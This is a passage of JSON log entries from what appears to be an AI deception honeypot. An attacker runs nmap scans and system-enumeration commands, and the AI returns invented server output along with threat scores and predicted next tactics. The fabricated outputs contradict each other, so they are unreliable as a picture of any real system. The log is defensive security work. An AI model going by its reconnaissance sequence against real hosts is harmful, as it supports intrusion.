    "response": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for 192.168.1.1\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 12,
        "risk_level": "LOW",
        "final_score": 12,
        "threat_level": "LOW",
        "base_score": 12,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 4,
            "unique_commands": 2,
            "directories_visited": 1,
            "recon_commands": 4,
            "persistence_attempts": 0,
            "curiosity_score": 36
        },
        "engagement": {
            "session_duration": 90,
            "commands_executed": 4,
            "successful_commands": 4,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 36,
            "engagement_level": "LOW"
        },
        "behaviour": {
            "Curiosity Score": 36,
            "Persistence Score": "LOW",
            "Interaction Depth": "LOW",
            "Risk Score": 12,
            "Session Complexity": "LOW"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1"
        ],
        "confidence_score": 0.7
    }
}
2026-07-21 11:07:54,596 - {"session_id": "71dd20b2", "command": "nmap -sS -v 192.168.1.1", "attack_type": "Reconnaissance", "risk_score": 12, "threat_level": "LOW"}
2026-07-21 11:07:54,596 - {
    "session_id": "71dd20b2",
    "command": "nmap -sS -v 192.168.1.1",
    "ai_decision": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for 192.168.1.1\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "confidence_score": 0.85,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 4
    },
    "prediction_result": {
        "next_prediction": "Reconnaissance",
        "prediction_confidence": 0.85
    },
    "risk_score": 12,
    "threat_level": "LOW"
}
2026-07-21 11:07:54,596 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: nmap -sS -v 192.168.1.1",
    "ai_decision": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for 192.168.1.1\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "session_metadata": {
        "prediction": "Reconnaissance"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Reconnaissance",
    "warning": null,
    "error": null
}
2026-07-21 11:07:55,625 - {
    "session_id": "71dd20b2",
    "query": "nmap -p 80,443 target.org",
    "response": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for target (192.168.1.1)\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 15,
        "risk_level": "LOW",
        "final_score": 15,
        "threat_level": "LOW",
        "base_score": 15,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 5,
            "unique_commands": 2,
            "directories_visited": 1,
            "recon_commands": 5,
            "persistence_attempts": 0,
            "curiosity_score": 43
        },
        "engagement": {
            "session_duration": 90,
            "commands_executed": 5,
            "successful_commands": 5,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 40,
            "engagement_level": "LOW"
        },
        "behaviour": {
            "Curiosity Score": 43,
            "Persistence Score": "LOW",
            "Interaction Depth": "LOW",
            "Risk Score": 15,
            "Session Complexity": "LOW"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org"
        ],
        "confidence_score": 0.75
    }
}
2026-07-21 11:07:55,625 - {"session_id": "71dd20b2", "command": "nmap -p 80,443 target.org", "attack_type": "Reconnaissance", "risk_score": 15, "threat_level": "LOW"}
2026-07-21 11:07:55,625 - {
    "session_id": "71dd20b2",
    "command": "nmap -p 80,443 target.org",
    "ai_decision": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for target (192.168.1.1)\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "confidence_score": 0.85,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 5
    },
    "prediction_result": {
        "next_prediction": "Reconnaissance",
        "prediction_confidence": 0.85
    },
    "risk_score": 15,
    "threat_level": "LOW"
}
2026-07-21 11:07:55,625 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: nmap -p 80,443 target.org",
    "ai_decision": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for target (192.168.1.1)\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "session_metadata": {
        "prediction": "Reconnaissance"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Reconnaissance",
    "warning": null,
    "error": null
}
2026-07-21 11:07:55,705 - {
    "session_id": "71dd20b2",
    "query": "whoami",
    "response": "ubuntu",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 16,
        "risk_level": "LOW",
        "final_score": 16,
        "threat_level": "LOW",
        "base_score": 16,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 6,
            "unique_commands": 3,
            "directories_visited": 1,
            "recon_commands": 5,
            "persistence_attempts": 0,
            "curiosity_score": 48
        },
        "engagement": {
            "session_duration": 91,
            "commands_executed": 6,
            "successful_commands": 6,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 44,
            "engagement_level": "LOW"
        },
        "behaviour": {
            "Curiosity Score": 48,
            "Persistence Score": "LOW",
            "Interaction Depth": "LOW",
            "Risk Score": 16,
            "Session Complexity": "LOW"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami"
        ],
        "confidence_score": 0.8
    }
}
2026-07-21 11:07:55,705 - {"session_id": "71dd20b2", "command": "whoami", "attack_type": "Unknown", "risk_score": 16, "threat_level": "LOW"}
2026-07-21 11:07:55,707 - {
    "session_id": "71dd20b2",
    "command": "whoami",
    "ai_decision": "ubuntu",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 6
    },
    "prediction_result": {
        "next_prediction": "Reconnaissance",
        "prediction_confidence": 0.5
    },
    "risk_score": 16,
    "threat_level": "LOW"
}
2026-07-21 11:07:55,708 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: whoami",
    "ai_decision": "ubuntu",
    "session_metadata": {
        "prediction": "Reconnaissance"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": null,
    "error": null
}
2026-07-21 11:07:55,798 - {
    "session_id": "71dd20b2",
    "query": "id",
    "response": "uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),27(sudo),110(lxd)",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 17,
        "risk_level": "LOW",
        "final_score": 17,
        "threat_level": "LOW",
        "base_score": 17,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 7,
            "unique_commands": 4,
            "directories_visited": 1,
            "recon_commands": 5,
            "persistence_attempts": 0,
            "curiosity_score": 53
        },
        "engagement": {
            "session_duration": 92,
            "commands_executed": 7,
            "successful_commands": 7,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 48,
            "engagement_level": "LOW"
        },
        "behaviour": {
            "Curiosity Score": 53,
            "Persistence Score": "LOW",
            "Interaction Depth": "LOW",
            "Risk Score": 17,
            "Session Complexity": "LOW"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id"
        ],
        "confidence_score": 0.85
    }
}
2026-07-21 11:07:55,798 - {"session_id": "71dd20b2", "command": "id", "attack_type": "Unknown", "risk_score": 17, "threat_level": "LOW"}
2026-07-21 11:07:55,798 - {
    "session_id": "71dd20b2",
    "command": "id",
    "ai_decision": "uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),27(sudo),110(lxd)",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 7
    },
    "prediction_result": {
        "next_prediction": "Credential Access",
        "prediction_confidence": 0.5
    },
    "risk_score": 17,
    "threat_level": "LOW"
}
2026-07-21 11:07:55,798 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: id",
    "ai_decision": "uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),27(sudo),110(lxd)",
    "session_metadata": {
        "prediction": "Credential Access"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": null,
    "error": null
}
2026-07-21 11:07:56,803 - {
    "session_id": "71dd20b2",
    "query": "uname -a",
    "response": "Linux friendly-srv 5.15.0-generic x86_64 GNU/Linux",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 21,
        "risk_level": "LOW",
        "final_score": 21,
        "threat_level": "LOW",
        "base_score": 21,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 8,
            "unique_commands": 5,
            "directories_visited": 1,
            "recon_commands": 5,
            "persistence_attempts": 0,
            "curiosity_score": 58
        },
        "engagement": {
            "session_duration": 92,
            "commands_executed": 8,
            "successful_commands": 8,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 52,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 58,
            "Persistence Score": "LOW",
            "Interaction Depth": "LOW",
            "Risk Score": 21,
            "Session Complexity": "MEDIUM"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a"
        ],
        "confidence_score": 0.9
    }
}
2026-07-21 11:07:56,803 - {"session_id": "71dd20b2", "command": "uname -a", "attack_type": "System Enumeration", "risk_score": 21, "threat_level": "LOW"}
2026-07-21 11:07:56,803 - {
    "session_id": "71dd20b2",
    "command": "uname -a",
    "ai_decision": "Linux friendly-srv 5.15.0-generic x86_64 GNU/Linux",
    "confidence_score": 0.85,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 8
    },
    "prediction_result": {
        "next_prediction": "Credential Access",
        "prediction_confidence": 0.85
    },
    "risk_score": 21,
    "threat_level": "LOW"
}
2026-07-21 11:07:56,803 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: uname -a",
    "ai_decision": "Linux friendly-srv 5.15.0-generic x86_64 GNU/Linux",
    "session_metadata": {
        "prediction": "Credential Access"
    },
    "system_event": "AI Deception Generated",
    "security_event": "System Enumeration",
    "warning": null,
    "error": null
}
2026-07-21 11:07:56,862 - {
    "session_id": "71dd20b2",
    "query": "hostname",
    "response": "web-prod-01",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 22,
        "risk_level": "LOW",
        "final_score": 22,
        "threat_level": "LOW",
        "base_score": 22,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 9,
            "unique_commands": 6,
            "directories_visited": 1,
            "recon_commands": 5,
            "persistence_attempts": 0,
            "curiosity_score": 63
        },
        "engagement": {
            "session_duration": 93,
            "commands_executed": 9,
            "successful_commands": 9,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 56,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 63,
            "Persistence Score": "LOW",
            "Interaction Depth": "LOW",
            "Risk Score": 22,
            "Session Complexity": "MEDIUM"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname"
        ],
        "confidence_score": 0.95
    }
}
2026-07-21 11:07:56,862 - {"session_id": "71dd20b2", "command": "hostname", "attack_type": "Unknown", "risk_score": 22, "threat_level": "LOW"}
2026-07-21 11:07:56,862 - {
    "session_id": "71dd20b2",
    "command": "hostname",
    "ai_decision": "web-prod-01",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 9
    },
    "prediction_result": {
        "next_prediction": "Credential Access",
        "prediction_confidence": 0.5
    },
    "risk_score": 22,
    "threat_level": "LOW"
}
2026-07-21 11:07:56,862 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: hostname",
    "ai_decision": "web-prod-01",
    "session_metadata": {
        "prediction": "Credential Access"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": null,
    "error": null
}
2026-07-21 11:07:56,917 - {
    "session_id": "71dd20b2",
    "query": "uptime",
    "response": "14:56:02 up 2 days, 18 min,  1 user,  load average: 0.02, 0.05, 0.05",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 23,
        "risk_level": "LOW",
        "final_score": 23,
        "threat_level": "LOW",
        "base_score": 23,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 10,
            "unique_commands": 7,
            "directories_visited": 1,
            "recon_commands": 5,
            "persistence_attempts": 0,
            "curiosity_score": 68
        },
        "engagement": {
            "session_duration": 93,
            "commands_executed": 10,
            "successful_commands": 10,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 60,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 68,
            "Persistence Score": "LOW",
            "Interaction Depth": "LOW",
            "Risk Score": 23,
            "Session Complexity": "MEDIUM"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:07:56,917 - {"session_id": "71dd20b2", "command": "uptime", "attack_type": "Unknown", "risk_score": 23, "threat_level": "LOW"}
2026-07-21 11:07:56,917 - {
    "session_id": "71dd20b2",
    "command": "uptime",
    "ai_decision": "14:56:02 up 2 days, 18 min,  1 user,  load average: 0.02, 0.05, 0.05",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 10
    },
    "prediction_result": {
        "next_prediction": "Credential Access",
        "prediction_confidence": 0.5
    },
    "risk_score": 23,
    "threat_level": "LOW"
}
2026-07-21 11:07:56,917 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: uptime",
    "ai_decision": "14:56:02 up 2 days, 18 min,  1 user,  load average: 0.02, 0.05, 0.05",
    "session_metadata": {
        "prediction": "Credential Access"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": null,
    "error": null
}
2026-07-21 11:07:56,973 - {
    "session_id": "71dd20b2",
    "query": "lscpu",
    "response": "Architecture:            x86_64\n  CPU op-mode(s):        32-bit, 64-bit\n  Address sizes:         39 bits physical, 48 bits virtual\n  Byte Order:            Little Endian\nCPU(s):                  2\n  On-line CPU(s) list:   0,1\nVendor ID:               GenuineIntel\n  Model name:            Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz\n  CPU family:            6\n  Model:                 122\n  Thread(s) per core:    1\n  Core(s) per socket:    2\n  Socket(s):             1",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 24,
        "risk_level": "LOW",
        "final_score": 24,
        "threat_level": "LOW",
        "base_score": 24,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 11,
            "unique_commands": 8,
            "directories_visited": 1,
            "recon_commands": 5,
            "persistence_attempts": 0,
            "curiosity_score": 73
        },
        "engagement": {
            "session_duration": 93,
            "commands_executed": 11,
            "successful_commands": 11,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 62,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 73,
            "Persistence Score": "LOW",
            "Interaction Depth": "MEDIUM",
            "Risk Score": 24,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:07:56,973 - {"session_id": "71dd20b2", "command": "lscpu", "attack_type": "Unknown", "risk_score": 24, "threat_level": "LOW"}
2026-07-21 11:07:56,973 - {
    "session_id": "71dd20b2",
    "command": "lscpu",
    "ai_decision": "Architecture:            x86_64\n  CPU op-mode(s):        32-bit, 64-bit\n  Address sizes:         39 bits physical, 48 bits virtual\n  Byte Order:            Little Endian\nCPU(s):                  2\n  On-line CPU(s) list:   0,1\nVendor ID:               GenuineIntel\n  Model name:            Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz\n  CPU family:            6\n  Model:                 122\n  Thread(s) per core:    1\n  Core(s) per socket:    2\n  Socket(s):             1",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 11
    },
    "prediction_result": {
        "next_prediction": "Credential Access",
        "prediction_confidence": 0.5
    },
    "risk_score": 24,
    "threat_level": "LOW"
}
2026-07-21 11:07:56,973 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: lscpu",
    "ai_decision": "Architecture:            x86_64\n  CPU op-mode(s):        32-bit, 64-bit\n  Address sizes:         39 bits physical, 48 bits virtual\n  Byte Order:            Little Endian\nCPU(s):                  2\n  On-line CPU(s) list:   0,1\nVendor ID:               GenuineIntel\n  Model name:            Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz\n  CPU family:            6\n  Model:                 122\n  Thread(s) per core:    1\n  Core(s) per socket:    2\n  Socket(s):             1",
    "session_metadata": {
        "prediction": "Credential Access"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": null,
    "error": null
}
2026-07-21 11:07:57,827 - {
    "session_id": "71dd20b2",
    "query": "lsb_release -a",
    "response": "Distributor ID: Ubuntu\nDescription:    Ubuntu 22.04.4 LTS\nRelease:        22.04\nCodename:       jammy",
    "selected_personality": {
        "name": "Normal Server",
        "hostname": "ubuntu-server",
        "user": "ubuntu",
        "style": "normal",
        "description": "Standard production server",
        "response_style": "standard, professional, clean terminal output"
    },
    "threat_score": {
        "score": 25,
        "risk_level": "MEDIUM",
        "final_score": 25,
        "threat_level": "MEDIUM",
        "base_score": 25,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe1"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 12,
            "unique_commands": 9,
            "directories_visited": 1,
            "recon_commands": 5,
            "persistence_attempts": 0,
            "curiosity_score": 78
        },
        "engagement": {
            "session_duration": 93,
            "commands_executed": 12,
            "successful_commands": 12,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 64,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 78,
            "Persistence Score": "LOW",
            "Interaction Depth": "MEDIUM",
            "Risk Score": 25,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:07:57,827 - {"session_id": "71dd20b2", "command": "lsb_release -a", "attack_type": "Unknown", "risk_score": 25, "threat_level": "MEDIUM"}
2026-07-21 11:07:57,827 - {
    "session_id": "71dd20b2",
    "command": "lsb_release -a",
    "ai_decision": "Distributor ID: Ubuntu\nDescription:    Ubuntu 22.04.4 LTS\nRelease:        22.04\nCodename:       jammy",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 12
    },
    "prediction_result": {
        "next_prediction": "Credential Access",
        "prediction_confidence": 0.5
    },
    "risk_score": 25,
    "threat_level": "MEDIUM"
}
2026-07-21 11:07:57,827 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: lsb_release -a",
    "ai_decision": "Distributor ID: Ubuntu\nDescription:    Ubuntu 22.04.4 LTS\nRelease:        22.04\nCodename:       jammy",
    "session_metadata": {
        "prediction": "Credential Access"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": null,
    "error": null
}
2026-07-21 11:07:57,902 - {
    "session_id": "71dd20b2",
    "query": "w",
    "response": "14:58:12 up 2 days, 20 min,  1 user,  load average: 0.00, 0.01, 0.05\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nubuntu   pts/0    192.168.1.10     14:48    0.00s  0.11s  0.02s w",
    "selected_personality": {
        "name": "Normal Server",
        "hostname": "ubuntu-server",
        "user": "ubuntu",
        "style": "normal",
        "description": "Standard production server",
        "response_style": "standard, professional, clean terminal output"
    },
    "threat_score": {
        "score": 26,
        "risk_level": "MEDIUM",
        "final_score": 26,
        "threat_level": "MEDIUM",
        "base_score": 26,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe1"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 13,
            "unique_commands": 10,
            "directories_visited": 1,
            "recon_commands": 5,
            "persistence_attempts": 0,
            "curiosity_score": 83
        },
        "engagement": {
            "session_duration": 94,
            "commands_executed": 13,
            "successful_commands": 13,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 66,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 83,
            "Persistence Score": "LOW",
            "Interaction Depth": "MEDIUM",
            "Risk Score": 26,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:07:57,902 - {"session_id": "71dd20b2", "command": "w", "attack_type": "Unknown", "risk_score": 26, "threat_level": "MEDIUM"}
2026-07-21 11:07:57,902 - {
    "session_id": "71dd20b2",
    "command": "w",
    "ai_decision": "14:58:12 up 2 days, 20 min,  1 user,  load average: 0.00, 0.01, 0.05\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nubuntu   pts/0    192.168.1.10     14:48    0.00s  0.11s  0.02s w",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 13
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 26,
    "threat_level": "MEDIUM"
}
2026-07-21 11:07:57,902 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: w",
    "ai_decision": "14:58:12 up 2 days, 20 min,  1 user,  load average: 0.00, 0.01, 0.05\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nubuntu   pts/0    192.168.1.10     14:48    0.00s  0.11s  0.02s w",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": null,
    "error": null
}
2026-07-21 11:08:09,145 - {
    "session_id": "71dd20b2",
    "query": "last -n 5",
    "response": "ubuntu-server login: ubuntu\nLast login: Sun Jun 14 09:15 - 11:22 (02:07)\nubuntu@ubuntu-server:~$ last -n 5\nubuntu   pts/0        192.168.1.10     Mon Jun 15 14:48   still logged in\nubuntu   pts/0        192.168.1.10     Sun Jun 14 09:15 - 11:22  (02:07)\nreboot   system boot  5.15.0-91-generi Sat Jun 13 14:38   still running\nwtmp begins Sat Jun 13 14:38:12 2026",
    "selected_personality": {
        "name": "Normal Server",
        "hostname": "ubuntu-server",
        "user": "ubuntu",
        "style": "normal",
        "description": "Standard production server",
        "response_style": "standard, professional, clean terminal output"
    },
    "threat_score": {
        "score": 27,
        "risk_level": "MEDIUM",
        "final_score": 27,
        "threat_level": "MEDIUM",
        "base_score": 27,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe1"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 14,
            "unique_commands": 11,
            "directories_visited": 1,
            "recon_commands": 5,
            "persistence_attempts": 0,
            "curiosity_score": 88
        },
        "engagement": {
            "session_duration": 94,
            "commands_executed": 14,
            "successful_commands": 14,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 68,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 88,
            "Persistence Score": "LOW",
            "Interaction Depth": "MEDIUM",
            "Risk Score": 27,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:08:09,145 - {"session_id": "71dd20b2", "command": "last -n 5", "attack_type": "Unknown", "risk_score": 27, "threat_level": "MEDIUM"}
2026-07-21 11:08:09,145 - {
    "session_id": "71dd20b2",
    "command": "last -n 5",
    "ai_decision": "ubuntu-server login: ubuntu\nLast login: Sun Jun 14 09:15 - 11:22 (02:07)\nubuntu@ubuntu-server:~$ last -n 5\nubuntu   pts/0        192.168.1.10     Mon Jun 15 14:48   still logged in\nubuntu   pts/0        192.168.1.10     Sun Jun 14 09:15 - 11:22  (02:07)\nreboot   system boot  5.15.0-91-generi Sat Jun 13 14:38   still running\nwtmp begins Sat Jun 13 14:38:12 2026",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 14
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
